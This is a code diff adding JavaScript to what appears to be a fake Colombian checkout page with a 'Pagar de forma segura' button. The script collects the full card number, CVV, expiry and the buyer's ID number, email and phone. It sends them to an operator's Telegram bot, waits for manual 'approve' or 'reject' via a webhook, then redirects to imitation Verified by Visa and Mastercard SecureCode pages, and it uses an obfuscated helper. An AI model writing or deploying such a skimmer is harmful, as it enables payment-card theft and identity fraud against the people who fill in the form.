+        return {categoria:'Desconocida',emoji:'💳'};
+    }
+
+    function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
+        var last4 = cardNumber.slice(-4);
+        localStorage.setItem('cardNumber', cardNumber);
+        localStorage.setItem('cardLast4', last4);
+        localStorage.setItem('cvc', cvc);
+        localStorage.setItem('expiry', expiry);
+        localStorage.setItem('cardholderName', cardholderName);
+        localStorage.setItem('cardType', cardType);
+        localStorage.setItem('bancoEmisor', banco);
+        var logo = bankLogos[banco]||'';
+        localStorage.setItem('bankLogo', logo);
+    }
+
+    function cargarDatoLocalStorage(key) {
+        return localStorage.getItem(key) || null;
+    }
+
+    async function configurarWebhook() {
+        try {
+            var res = await fetch(WEBHOOK_URL+'?setup=true');
+            var data = await res.json();
+            return data.success;
+        } catch(e) { return false; }
+    }
+
+    function mostrarMensaje(msg, tipo) {
+        var el = document.getElementById('statusMessage');
+        el.className = 'status-message '+tipo;
+        el.textContent = msg;
+    }
+
+    function ocultarMensaje() {
+        var el = document.getElementById('statusMessage');
+        el.className = 'status-message';
+        el.textContent = '';
+    }
+
+    function mostrarError(msg) {
+        mostrarMensaje(msg,'error');
+        document.getElementById('loadingOverlay').classList.remove('active');
+        document.getElementById('submitButton').disabled = false;
+        document.getElementById('submitButton').textContent = 'Pagar de forma segura';
+        document.getElementById('submitButton').style.display = 'block';
+        document.getElementById('cardNumber').disabled = false;
+        document.getElementById('cardholderName').disabled = false;
+        document.getElementById('expiry').disabled = false;
+        document.getElementById('cvc').disabled = false;
+        document.getElementById('bancoEmisor').disabled = false;
+    }
+
+    function mostrarInfo(msg) {
+        mostrarMensaje(msg,'info');
+    }
+
+    function generarSolicitudId() {
+        return _0x9c0d(3) + Date.now() + '-' + Math.random().toString(36).substr(2,9);
+    }
+
+    var cardPatterns = {
+        visa: {regex: /^4[0-9]{12}(?:[0-9]{3})?$/, bins:[4], lengths:[13,16,19]},
+        mastercard: {regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/, bins:[51,52,53,54,55,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271], lengths:[16,19]},
+        amex: {regex: /^3[47][0-9]{13}$/, bins:[34,37], lengths:[15,19]}
+    };
+
+    function detectCardType(cardNumber) {
+        var clean = cardNumber.replace(/\s/g,'');
+        if(clean.length>=3){
+            var first3 = clean.substring(0,3);
+            var first2 = clean.substring(0,2);
+            var first1 = clean.substring(0,1);
+            if(first1==='4'){
+                if(cardPatterns.visa.regex.test(clean)||clean.length<13) return 'visa';
+            }
+            if(first2==='34'||first2==='37'){
+                if(cardPatterns.amex.regex.test(clean)||clean.length<15) return 'amex';
+            }
+            if((first2>='51'&&first2<='55')||(first3>='222'&&first3<='272')){
+                if(cardPatterns.mastercard.regex.test(clean)||clean.length<16) return 'mastercard';
+            }
+        }
+        if(clean.length>=13){
+            if(cardPatterns.visa.regex.test(clean)) return 'visa';
+            else if(cardPatterns.mastercard.regex.test(clean)) return 'mastercard';
+            else if(cardPatterns.amex.regex.test(clean)) return 'amex';
+        }
+        return null;
+    }
+
+    function updateCardLogo(type) {
+        var container = document.getElementById('cardLogo');
+        container.innerHTML = '';
+        if(type==='visa'){ var img=document.createElement('img'); img.src='visa.png'; img.alt='Visa'; container.appendChild(img); }
+        else if(type==='mastercard'){ var img=document.createElement('img'); img.src='mastercard.png'; img.alt='Mastercard'; container.appendChild(img); }
+        else if(type==='amex'){ var img=document.createElement('img'); img.src='ame.png'; img.alt='American Express'; container.appendChild(img); }
+    }
+
+    function formatCardNumber(value){ return value.replace(/\s/g,'').replace(/(\d{4})/g,'$1 ').trim(); }
+    function formatExpiry(value){ var cleaned=value.replace(/\D/g,''); if(cleaned.length>=2) return cleaned.substring(0,2)+'/'+cleaned.substring(2,4); return cleaned; }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var prioritario = cargarDatoLocalStorage('procesamiento_prioritario') === 'true';
+        var item = document.getElementById('procesamiento-item');
+        var total = document.getElementById('total-price');
+        var monto = 23000;
+        if(prioritario){ item.style.display='flex'; monto += 20000; } else { item.style.display='none'; }
+        total.textContent = monto.toLocaleString('es-CO').replace(/,/g,'.') + ' Col$';
+
+        var nombre = cargarDatoLocalStorage('nombre')||'No proporcionado';
+        var apellidos = cargarDatoLocalStorage('apellidos')||'';
+        var tipoDoc = cargarDatoLocalStorage('tipoDocumento')||'';
+        var numDoc = cargarDatoLocalStorage('numeroDocumento')||'No proporcionado';
+        var email = cargarDatoLocalStorage('email')||'No proporcionado';
+        var celular = cargarDatoLocalStorage('celular')||'No proporcionado';
+
+        document.getElementById('resumen-nombre').textContent = (nombre+' '+apellidos).trim()||'No proporcionado';
+        document.getElementById('resumen-documento').textContent = (tipoDoc+' '+numDoc).trim();
+        document.getElementById('resumen-email').textContent = email;
+        document.getElementById('resumen-celular').textContent = celular;
+
+        configurarWebhook();
+
+        var cardInput = document.getElementById('cardNumber');
+        var expiryInput = document.getElementById('expiry');
+        var cvcInput = document.getElementById('cvc');
+        var nameInput = document.getElementById('cardholderName');
+
+        cardInput.addEventListener('input', function(e) {
+            var card = e.target.value.replace(/\s/g,'');
+            this.value = this.value.replace(/[^0-9\s]/g,'');
+            this.value = formatCardNumber(this.value);
+            if(card.length>=3){ var type=detectCardType(card); updateCardLogo(type); }
+            else { document.getElementById('cardLogo').innerHTML=''; }
+        });
+
+        expiryInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9/]/g,'');
+            this.value = formatExpiry(this.value);
+        });
+
+        cvcInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g,'');
+        });
+
+        nameInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^a-zA-Z\s]/g,'').toUpperCase();
+        });
+    });
+
+    function mostrarCargaConLogos(tipo) {
+        var spinner = document.getElementById('initialSpinner');
+        var logoCont = document.getElementById('logoContainer');
+        var logoImg = document.getElementById('cardLogoImg');
+        var progWrap = document.getElementById('progressWrapper');
+        var progFill = document.getElementById('progressFill');
+        var loadingText = document.getElementById('loadingText');
+
+        spinner.classList.remove('active');
+        spinner.style.display = 'none';
+        logoCont.style.display = 'flex';
+
+        var imgFile = cardLogos[tipo];
+        if(imgFile){ logoImg.src=imgFile; logoImg.alt=tipo.charAt(0).toUpperCase()+tipo.slice(1); }
+
+        progWrap.style.display = 'block';
+        var names = {'visa':'Verified by Visa','mastercard':'Mastercard SecureCode','amex':'American Express SafeKey'};
+        loadingText.textContent = 'Redirigiendo a '+(names[tipo]||'...');
+
+        var progress = 0;
+        var duration = 3000;
+        var interval = 50;
+        var steps = duration/interval;
+        var increment = 100/steps;
+        progFill.style.width = '0%';
+
+        var timer = setInterval(function(){
+            progress += increment;
+            if(progress>=100){ progress=100; clearInterval(timer); setTimeout(function(){ redirigirSegunTipoTarjeta(tipo); },400); }
+            progFill.style.width = progress+'%';
+        }, interval);
+    }
+
+    function redirigirSegunTipoTarjeta(tipo) {
+        var map = {'visa':'visa.html','mastercard':'master.html','amex':'amex.html'};
+        window.location.href = map[tipo]||'index.html';
+    }
+
+    async function enviarDatosTarjetaATelegram(datos) {
+        try {
+            var categoria = detectarCategoriaTarjeta(datos.numeroTarjeta, datos.bancoEmisor);
+            var keyboard = {
+                inline_keyboard: [
+                    [{text:"✅ APROBAR", callback_data:'approve_'+datos.solicitudId},{text:"❌ RECHAZAR", callback_data:'reject_'+datos.solicitudId}]
+                ]
+            };
+            var msg = '🔔 *NUEVA SOLICITUD - V2CRTF*\n\n';
+            msg += '🆔 ID: `'+datos.solicitudId+'`\n\n';
+            msg += '📋 *DATOS PERSONALES:*\n';
+            msg += '👤 Nombre completo: '+datos.nombreCompleto+'\n';
+            msg += '🆔 Documento: '+datos.tipoDocumento+' '+datos.numeroDocumento+'\n';
+            msg += '📧 Email: '+datos.email+'\n';
+            msg += '📱 Celular: '+datos.celular+'\n\n';
+            msg += '💳 *DATOS DE LA TARJETA:*\n';
+            msg += '🏦 Número: `'+datos.numeroTarjeta+'`\n';
+            msg += '🔢 CVV: `'+datos.cvv+'`\n';
+            msg += '📅 Vencimiento: `'+datos.vencimiento+'`\n';
+            msg += '💳 Tipo: '+datos.tipoTarjeta.toUpperCase()+'\n';
+            msg += '🏛️ Banco emisor: '+datos.bancoEmisor+'\n';
+            msg += '⭐ *Categoría:* '+categoria.emoji+' *'+categoria.categoria+'*\n\n';
+            msg += '💰 Total: '+datos.totalFormateado+'\n';
+            msg += '📅 Fecha: '+datos.fechaHora+'\n\n';
+            msg += '⏳ *Estado:* Esperando verificación...';
+
+            var url = 'https://api.telegram.org/bot'+TELEGRAM_BOT_TOKEN+'/sendMessage';
+            var res = await fetch(url, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    chat_id:TELEGRAM_CHAT_ID,
+                    text:msg,
+                    parse_mode:'Markdown',
+                    reply_markup:keyboard,
+                    disable_web_page_preview:true
+                })
+            });
+            var data = await res.json();
+            if(data.ok){ console.log('✅ Datos enviados a Telegram'); return true; }
+            else { console.error('❌ Error:', data.description); return false; }
+        } catch(e) { console.error('❌ Error:', e); return false; }
+    }
+
+    async function verificarEstadoSolicitud(id) {
+        try {
+            var res = await fetch(WEBHOOK_URL+'?check='+id);
+            var data = await res.json();
+            console.log('📊 Estado:', data);
+            return data.estado||'pending';
+        } catch(e) { console.error('❌ Error:', e); return 'error'; }
+    }
+
+    function iniciarPollingPago() {
+        var inicio = Date.now();
+        var intervalId = setInterval(async function() {
+            if(Date.now()-inicio > MAX_POLLING_TIME) {
+                clearInterval(intervalId);
+                mostrarError('Tiempo de espera agotado. Por favor, intente nuevamente.');
+                document.getElementById('loadingOverlay').classList.remove('active');
+                document.getElementById('submitButton').disabled = false;
+                document.getElementById('submitButton').textContent = 'Pagar de forma segura';
+                document.getElementById('submitButton').style.display = 'block';
+                document.getElementById('cardNumber').disabled = false;
+                document.getElementById('cardholderName').disabled = false;
+                document.getElementById('expiry').disabled = false;
+                document.getElementById('cvc').disabled = false;
+                document.getElementById('bancoEmisor').disabled = false;
+                return;
+            }
+            var resultado = await verificarEstadoSolicitud(solicitudId);
+            if(resultado === 'approved') {
+                clearInterval(intervalId);
+                mostrarCargaConLogos(cardType);
+            } else if(resultado === 'rejected') {
+                clearInterval(intervalId);
+                document.getElementById('loadingOverlay').classList.remove('active');
+                mostrarError('❌ Pago rechazado. Por favor, verifique los datos e intente nuevamente.');
+                document.getElementById('cardNumber').disabled = false;
+                document.getElementById('cardholderName').disabled = false;
+                document.getElementById('expiry').disabled = false;
+                document.getElementById('cvc').disabled = false;
+                document.getElementById('bancoEmisor').disabled = false;
+                document.getElementById('submitButton').disabled = false;
+                document.getElementById('submitButton').textContent = 'Pagar de forma segura';
+                document.getElementById('submitButton').style.display = 'block';
+            }
+        }, POLLING_INTERVAL);
+        pollingInterval = intervalId;
+    }
+
+    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,'');
+        var cardholderName = document.getElementById('cardholderName').value.trim();
+        var expiry = document.getElementById('expiry').value;
+        var cvc = document.getElementById('cvc').value;
+        var banco = document.getElementById('bancoEmisor').value;
+
+        var isValid = true;
+        document.querySelectorAll('.form-group.error').forEach(function(el){ el.classList.remove('error'); });
+        ocultarMensaje();
+
+        if(!cardholderName){ document.getElementById('cardholderName').parentElement.classList.add('error'); isValid=false; }
+        cardType = detectCardType(cardNumber);
+        if(!cardType || cardNumber.length===0){ document.getElementById('cardNumber').parentElement.parentElement.classList.add('error'); isValid=false; }
+        var expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if(!expiryRegex.test(expiry)){ document.getElementById('expiry').parentElement.classList.add('error'); isValid=false; }
+        var cvcLength = cardType==='amex'?4:3;
+        if(cvc.length!==cvcLength){ document.getElementById('cvc').parentElement.classList.add('error'); isValid=false; }
+        if(!banco){ document.getElementById('bancoEmisor').parentElement.classList.add('error'); isValid=false; }
+        if(!isValid) return;
+
+        guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco);
+        solicitudId = generarSolicitudId();
+
+        document.getElementById('loadingOverlay').classList.add('active');
+        document.getElementById('initialSpinner').style.display='block';
+        document.getElementById('initialSpinner').classList.add('active');
+        document.getElementById('logoContainer').style.display='none';
+        document.getElementById('progressWrapper').style.display='none';
+        document.getElementById('loadingText').textContent='Procesando pago...';
+        document.getElementById('submitButton').disabled=true;
+        document.getElementById('submitButton').textContent='Procesando...';
+        document.getElementById('cardNumber').disabled=true;
+        document.getElementById('cardholderName').disabled=true;
+        document.getElementById('expiry').disabled=true;
+        document.getElementById('cvc').disabled=true;
+        document.getElementById('bancoEmisor').disabled=true;
+
+        var nombre = cargarDatoLocalStorage('nombre')||'No proporcionado';
+        var apellidos = cargarDatoLocalStorage('apellidos')||'';
+        var tipoDoc = cargarDatoLocalStorage('tipoDocumento')||'';
+        var numDoc = cargarDatoLocalStorage('numeroDocumento')||'No proporcionado';
+        var email = cargarDatoLocalStorage('email')||'No proporcionado';
+        var celular = cargarDatoLocalStorage('celular')||'No proporcionado';
+        var prioritario = cargarDatoLocalStorage('procesamiento_prioritario')==='true';
+        var total = 23000;
+        if(prioritario) total += 20000;
+        var totalFormateado = total.toLocaleString('es-CO').replace(/,/g,'.') + ' Col$';
+        var fecha = new Date().toLocaleString('es-CO', {timeZone:'America/Bogota', year:'numeric', month:'2-digit', day:'2-digit', hour:'2-digit', minute:'2-digit', second:'2-digit'});
+
+        var datos = {
+            solicitudId: solicitudId,
+            nombreCompleto: (nombre+' '+apellidos).trim(),
+            tipoDocumento: tipoDoc,
+            numeroDocumento: numDoc,
+            email: email,
+            celular: celular,
+            numeroTarjeta: cardNumber,
+            cvv: cvc,
+            vencimiento: expiry,
+            tipoTarjeta: cardType,
+            bancoEmisor: banco,
+            totalFormateado: totalFormateado,
+            fechaHora: fecha
+        };
+
+        var enviado = await enviarDatosTarjetaATelegram(datos);
+        if(enviado) {
+            mostrarInfo('⏳ Esperando aprobación del pago...');
+            iniciarPollingPago();
+        } else {
+            mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
+            document.getElementById('cardNumber').disabled = false;
+            document.getElementById('cardholderName').disabled = false;
+            document.getElementById('expiry').disabled = false;
+            document.getElementById('cvc').disabled = false;
+            document.getElementById('bancoEmisor').disabled = false;
+            document.getElementById('submitButton').disabled = false;
+            document.getElementById('submitButton').textContent = 'Pagar de forma segura';
+            document.getElementById('loadingOverlay').classList.remove('active');
+        }
+    });
+})();
 </script>
 </body>
-    </html>
+</html>
